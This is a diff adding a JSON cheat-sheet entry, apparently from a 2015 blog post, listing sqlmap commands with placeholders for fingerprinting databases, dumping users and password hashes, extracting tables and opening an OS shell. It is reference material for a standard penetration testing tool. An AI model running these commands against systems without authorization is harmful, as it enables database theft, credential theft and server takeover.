@@ -1,0 +1,88 @@
+{
+    "id": "sqlmap_cheat_sheet",
+    "name": "sqlmap",
+    "description": "Sqlmap: is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers::netwrkspider",
+    "metadata": {
+        "sourceName": "blogger",
+        "sourceUrl": "http://netwrkspider.blogspot.in/2015/09/security-cheat-sheet-sqlmap.html"
+    },
+    "template_type": "terminal",
+    "section_order": [
+        "Scanning with sqlmap",
+        "About Me"
+    ],
+    "sections": {
+        "Scanning with sqlmap": [
+            {
+                "val": "Test HTTP URL and POST data and return database banner",
+                "key": "./sqlmap.py --url=<url> --data=<post-data> --banner"
+            },
+            {
+                "val": "Parse request data and test | request data can be obtained with burp",
+                "key": "./sqlmap.py -r <request-file> <options>"
+            },
+            {
+                "val": "Fingerprint | much more information than banner",
+                "key": "./sqlmap.py -r <request-file> --fingerprint"
+            },
+            {
+                "val": "Get database username, name, and hostname",
+                "key": "./sqlmap.py -r <request-file> --current-user --current-db --hostname"
+            },
+            {
+                "val": "Check if user is a database admin",
+                "key": "./sqlmap.py -r <request-file> --is-dba"
+            },
+            {
+                "val": "Get database users and password hashes",
+                "key": "./sqlmap.py -r <request-file> --users --passwords"
+            },
+            {
+                "val": "Enumerate databases",
+                "key": "./sqlmap.py -r <request-file> --dbs"
+            },
+            {
+                "val": "List tables for one database",
+                "key": "./sqlmap.py -r <request-file> -D <db-name> --tables"
+            },
+            {
+                "val": "Other database commands",
+                "key": "./sqlmap.py -r <request-file> -D <db-name> --columns --schema --count"
+            },
+            {
+                "val": "Sqlmap Enumeration flags",
+                "key": "./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> -U <user-name>"
+            },
+            {
+                "val": "Extract data",
+                "key": "./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> --dump"
+            },
+            {
+                "val": "Execute SQL Query",
+                "key": "./sqlmap.py -r <request-file> --prefix=<sql-query> --suffix=<sql-query>"
+            },
+            {
+                "val": "Get backdoor access to sql server | can give shell access",
+                "key": "./sqlmap.py -r <request-file> --os-shell"
+            },
+            {
+                "val": "Append/Prepend SQL Queries",
+                "key": "./sqlmap.py -r <request-file> --prefix=<sql-query> --suffix=<sql-query>"
+            }
+        ],
+        "About Me": [
+            {
+                "val": "Name",
+                "key": "netwrk­spider"
+            },
+            {
+                "val": "website",
+                "key": "http://www.netwrkspider.org"
+            },
+            {
+                "val": "Job Profile",
+                "key": "Security Researcher & Developers"
+            }
+        ]
+    }
+}
